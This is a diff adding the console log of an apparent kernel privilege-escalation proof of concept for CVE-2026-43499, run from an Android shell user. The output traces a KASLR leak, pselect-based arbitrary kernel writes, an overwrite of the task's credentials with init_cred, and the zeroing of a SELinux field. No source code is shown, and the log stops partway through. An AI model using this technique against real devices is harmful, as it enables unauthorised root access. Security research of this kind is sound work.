@@ -1,0 +1,64 @@
+[34m=======================================================================[0m
+[97m                     CVE-2026-43499 Challenge Gate[0m
+[34m=======================================================================[0m
+[32m[Author] Kernix[0m
+[32m[Repository] https://github.com/Linuxoid-cn/CVE-2026-43499-Poc-Analysis[0m
+[33m[Challenge][0m [35m7b2ny0e4segkerum[0m
+[33m[Signature] Enter value: [0m[32mpassword verify ok[0m
+[32m[+] [0mpreload starting pid=9917
+[32m[+] [0mruntime performance cpu=7 max_freq=4608000 capacity=1024
+[32m[+] [0mstartup pid=9917 uid=2000 attr=u:r:shell:s0 enforce=1 direct_cpu=7
+[33m[*] [0mdirect boot_id backup valid=1
+[32m[+] [0mdirect boot_id[backup]=a3373442-7073-4137-9a5d-c2f31232af23
+[33m[*] [0mslide ktext calibrated base=ffffffe7af800000 cpu=0 sites=ad73f0,4e898
+[33m[*] [0mslide attempt 1 uses pselect shift=12
+[32m[+] [0mslide child pid=14432 uid=2000 direct_cpu=7
+[33m[*] [0mslide pselect setup shift=12 page=ffffff8a7de10000 fake_lock=ffffff8a7de104d0 fake_w0=ffffff8a7de113a0 fake_task=ffffff8a7de12380
+[33m[*] [0mslide res readiness installed=140
+[33m[*] [0mslide res enc in=0000000000000082 0000000000000000 ffffffe7b1be20e0 0000000000000000 ffffffe7b1d0b558 out=0000000000000082 0000000000000000 ffffffe7b1becf00 ffffff8a7de104d0 0000000000000003 ex=0000000000000000 0000000000000000 ffffffe7b1be20e0 nready=140
+[33m[*] [0mslide pselect before syscall
+[33m[*] [0mslide consumer before tgkill tid=14433 calls=1
+[33m[*] [0mslide consumer before sched tid=14433 alive_ret=0 alive_errno=0
+[33m[*] [0mslide consumer sched tid=14433 alive_ret=0 alive_errno=0 sched_ret=0 sched_errno=0
+[33m[*] [0mslide pselect returned ret=182 errno=0 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[32m[+] [0mslide boot_id_leaked_nfulnl_logger pid=14432 value=ffffffe7b1be2198 stext=ffffffe7af800000
+[32m[+] [0mslide boot_id-derived_stext pid=14432 value=ffffffe7af800000
+[32m[+] [0mslide-kaslr-ok pid=9917 base=ffffffe7af800000 slide=000000272f800000
+[33m[*] [0mslide generation released before direct stage
+[32m[+] [0mdirect mode=init_cred runtime_cpu=7
+[32m[+] [0mdirect-step direct_root_enter uid=2000 pid=9917
+[32m[+] [0mdirect-root-parent cpu=7 pid=9917 tid=9917
+[32m[+] [0mdirect-r64-plan name=per_cpu_offset attempt=1/3 idx=0 shape=0 cpu=7 pid=9917 tid=9917 B=ffffffe7b1d0b558 Q=ffffffe7b1bdb848 Q8=ffffffe7b1bdb850 Q16=ffffffe7b1bdb858
+[32m[+] [0mdirect-w64[0] target=ffffffe7b1d0b558 value=ffffffe7b1bdb848 shape=0 workspace=ffffff8a7e200000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8a7e200000 target=ffffffe7b1d0b558 value=ffffffe7b1bdb848
+[33m[*] [0mpselect res readiness attempt=1 installed=141
+[33m[*] [0mpselect res attempt=1 ret=173 errno=0 calls=1 success=1 installed=141
+[32m[+] [0mdirect-r64-oracle name=per_cpu_offset attempt=1 idx=0 shape=0 cpu_before=7 cpu_after_trigger=7 cpu_after_read=7 value=ffffffa3b601d000 sidecar=ffffffe7b1d0b558 expected_sidecar=ffffffe7b1d0b558 raw8=58 expected_raw8=58 ok=1
+[32m[+] [0mdirect-percpu cpu=7 base=ffffffe7b1bdb810 slot=ffffffe7b1bdb848 delta=ffffffa3b601d000 page_aligned=1 entry_slot=ffffff8b67baf400 direct=1 aligned=1
+[32m[+] [0mdirect entry_slot=ffffff8b67baf400 cpu=7 delta=ffffffa3b601d000
+[32m[+] [0mdirect-r64-plan name=entry_task attempt=1/3 idx=1 shape=0 cpu=7 pid=9917 tid=9917 B=ffffffe7b1d0b558 Q=ffffff8b67baf400 Q8=ffffff8b67baf408 Q16=ffffff8b67baf410
+[32m[+] [0mdirect-w64[1] target=ffffffe7b1d0b558 value=ffffff8b67baf400 shape=0 workspace=ffffff8a779b8000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8a779b8000 target=ffffffe7b1d0b558 value=ffffff8b67baf400
+[33m[*] [0mpselect res readiness attempt=1 installed=140
+[33m[*] [0mpselect res attempt=1 ret=180 errno=0 calls=1 success=1 installed=140
+[32m[+] [0mdirect-r64-oracle name=entry_task attempt=1 idx=1 shape=0 cpu_before=7 cpu_after_trigger=7 cpu_after_read=7 value=ffffff8996462c80 sidecar=ffffffe7b1d0b558 expected_sidecar=ffffffe7b1d0b558 raw8=58 expected_raw8=58 ok=1
+[32m[+] [0mdirect-entry cpu=7 observed_cpu=7 slot=ffffff8b67baf400 task=ffffff8996462c80 direct=1 aligned=1 pid=9917 tid=9917
+[32m[+] [0mdirect entry sample task=ffffff8996462c80 pid=9917 cpu=7
+[32m[+] [0mdirect pre-cred selinux preserved enforcing=1
+[32m[+] [0mdirect-step before_init_cred uid=2000 pid=9917 task=ffffff8996462c80
+[32m[+] [0mdirect-step install_real_cred attempt=1/3 target=ffffff8996463578 value=ffffffe7b1c02cb0
+[32m[+] [0mdirect-w64[2] target=ffffff8996463578 value=ffffffe7b1c02cb0 shape=1 workspace=ffffff8a60060000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8a60060000 target=ffffff8996463578 value=ffffffe7b1c02cb0
+[33m[*] [0mpselect res readiness attempt=1 installed=97
+[33m[*] [0mpselect res attempt=1 ret=159 errno=0 calls=1 success=1 installed=97
+[32m[+] [0mdirect-step install_cred_then_selinux_zero target=ffffff8996463580 value=ffffffe7b1c02cb0 followup=ffffffe7b1e663c8
+[32m[+] [0mdirect-w64[3] target=ffffff8996463580 value=ffffffe7b1c02cb0 shape=1 workspace=ffffff8a7e448000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8a7e448000 target=ffffff8996463580 value=ffffffe7b1c02cb0
+[33m[*] [0mpselect res readiness attempt=1 installed=103
+[33m[*] [0mpselect res attempt=1 ret=170 errno=0 calls=1 success=1 installed=103
+[32m[+] [0mdirect-w64[4] target=ffffffe7b1e663c8 value=ffffff8a7e448100 shape=1 workspace=ffffff8a80c90000
+[33m[*] [0mpselect res prepare attempt=1 page=ffffff8a80c90000 target=ffffffe7b1e663c8 value=ffffff8a7e448100
+[33m[*] [0mpselect res readiness attempt=1 installed=97
+[33m[*] [0mpselect res attempt=1 ret=160 errno=0 calls=1 success=1 installed=97
+[32m[+] [0mdirect-step restore_boot_id_lo attempt=1/3 target=ffffffe7b1d0b558 value=37417370423437a3
+[32m[+] [0mdirect-w64[7] target=ffffffe7b1d0b558 value=37417370423437a3 shape=1 workspace=ffffff8a80fd8000
